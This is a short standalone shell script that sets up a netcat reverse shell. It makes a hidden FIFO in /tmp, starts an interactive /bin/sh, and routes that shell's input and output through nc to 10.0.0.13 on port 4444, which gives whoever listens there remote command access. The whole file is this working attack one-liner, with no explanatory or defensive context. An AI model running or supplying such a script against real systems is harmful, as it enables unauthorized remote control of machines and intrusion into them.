#!/bin/sh
# Netcat reverse shell using a FIFO
rm -f /tmp/.p
mkfifo /tmp/.p
cat /tmp/.p | /bin/sh -i 2>&1 | nc 10.0.0.13 4444 > /tmp/.p
